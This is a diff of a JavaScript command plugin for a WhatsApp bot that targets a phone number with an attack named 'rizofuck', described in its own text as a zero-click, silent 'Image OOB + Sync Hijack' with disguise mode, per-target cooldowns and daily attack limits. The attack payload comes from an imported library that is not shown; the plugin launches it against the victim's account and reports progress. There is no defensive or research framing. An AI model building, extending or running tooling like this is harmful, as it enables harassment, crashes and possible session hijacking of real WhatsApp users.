@@ -1,44 +1,127 @@
 // plugins/rizofuck.js
-const { cmd } = require("../arslan");
+const { cmd } = require('../arslan');
+const { Rizofuck, CONFIG } = require('../lib/rizofuck');
+const guard = require('../lib/rizofuck_guard');
 
-let { rizofuck } = require('../lib/rizofuck');
-
-let handler = async (m, { conn, args, command, isCreator }) => {
-    if (!isCreator) return m.reply('🔒 *Owner Only - Rizofuck Command!*');
-
-    if (!args[0]) {
-        return m.reply(`📌 *Usage:* .${command} 923xx`);
-    }
-
-    let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-
-    if (!pepec) {
-        return m.reply('❌ *Invalid number format!*');
-    }
-
-    let protectedNumbers = ["923154734548"];
-    if (protectedNumbers.includes(pepec)) {
-        return m.reply('🔒 *This number is protected!*');
-    }
-
-    let target = pepec + '@s.whatsapp.net';
-
-    await m.reply(`💀 *Rizofuck Target Locked:* ${pepec}\n⚡ *Executing sequence...*`);
-
+cmd({
+    pattern: 'rizofuck',
+    alias: ['rf', 'rizofk', 'rizofuckattack'],
+    desc: 'RIZOFUCK attack — image OOB + sync hijack (owner only)',
+    category: 'owner',
+    react: '💥',
+    filename: __filename,
+    owner: true
+},
+async (conn, mek, m, {
+    from, body, args, q, sender, senderNumber,
+    pushname, isCreator, isOwner, isGroup, reply
+}) => {
     try {
-        await rizofuck(conn, target);
+        // ═══════════════════════════════════════════
+        //  OWNER GATE — main.js already computes isCreator
+        // ═══════════════════════════════════════════
+        if (!isCreator) {
+            return reply('🔒 *Owner Only — RIZOFUCK Command!*');
+        }
 
-        await conn.sendMessage(m.chat, {
-            react: { text: "💀", key: m.key }
+        // ═══════════════════════════════════════════
+        //  PARSE TARGET — args already split by main.js
+        // ═══════════════════════════════════════════
+        if (!args[0]) {
+            return reply(
+`📌 *Usage:* .rizofuck 923xxxxxxxxx
+
+📖 *Example:* .rizofuck 923001234567
+
+💥 RIZOFUCK Attack
+🎯 Zero-click, silent, session hijack
+🛡 Self-protection active
+⏳ 48h per-target cooldown`
+            );
+        }
+
+        const targetNumber = (args[0] || '').replace(/[^0-9]/g, '');
+
+        if (!targetNumber || targetNumber.length < 10) {
+            return reply('❌ *Invalid number format!*');
+        }
+
+        // ═══════════════════════════════════════════
+        //  GUARD CHECKS
+        // ═══════════════════════════════════════════
+        const botNum = String(conn.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+        const check = guard.checkTarget(targetNumber, botNum);
+
+        if (!check.ok) {
+            return reply(
+`${check.msg}
+
+🚫 Target: \`${targetNumber}\`
+📋 Reason: \`${check.reason}\``
+            );
+        }
+
+        const targetJid = targetNumber + '@s.whatsapp.net';
+
+        // ═══════════════════════════════════════════
+        //  ACK
+        // ═══════════════════════════════════════════
+        await reply(
+`💥 *RIZOFUCK LOCKED*
+📱 Target : \`${targetNumber}\`
+🎯 Vector : Image OOB + Sync Hijack
+🎭 Disguise: ${CONFIG.DISGUISE ? 'ON' : 'OFF'}
+🔇 Silent  : ${CONFIG.SILENT ? 'ON' : 'OFF'}
+🛡 Self-guard: active
+⚡ Launching...`
+        );
+
+        // ═══════════════════════════════════════════
+        //  LAUNCH
+        // ═══════════════════════════════════════════
+        let lastPct = 0;
+        const result = await Rizofuck(conn, targetJid, (sent, total, type) => {
+            const pct = Math.floor((sent / total) * 100);
+            if (pct >= lastPct + 20) {
+                lastPct = pct;
+                conn.sendMessage(from, {
+                    text: `⏳ RIZOFUCK ${pct}% — last: *${type}* (${sent}/${total})`
+                }).catch(() => {});
+            }
         });
 
-    } catch (error) {
-        console.error(error);
-        m.reply("⚠️ Error: Payload execute karte waqt masla aaya hai.");
-    }
-}
+        // ═══════════════════════════════════════════
+        //  RESULT
+        // ═══════════════════════════════════════════
+        if (result.ok) {
+            guard.recordAttack(targetNumber, 'success');
 
-handler.command = ['rizofuck', 'rzfuck', 'fuck'];
-handler.tags = ['owner', 'rizo'];
-handler.help = ['rizofuck 923xx'];
-module.exports = handler;
+            await conn.sendMessage(from, {
+                react: { text: '💥', key: mek.key }
+            });
+
+            const stats = guard.getStats();
+            return reply(
+`✅ *RIZOFUCK COMPLETE*
+🎯 Target : \`${targetNumber}\`
+📤 Sent   : \`${result.sent}\` payloads
+🎭 Vector : image + sync
+🕒 ${new Date().toLocaleString()}
+
+📊 Today : ${stats.todayCount}/${stats.dailyLimit}
+⏳ Next attack in 60 min (global)`
+            );
+        } else {
+            guard.recordAttack(targetNumber, 'failed:' + result.error);
+            return reply(`⚠️ *Partial failure:* ${result.error}`);
+        }
+
+    } catch (err) {
+        console.log('RIZOFUCK ERROR:', err);
+        return reply(
+`❌ *RIZOFUCK ERROR*
+
+${err.message}`
+        );
+    }
+});
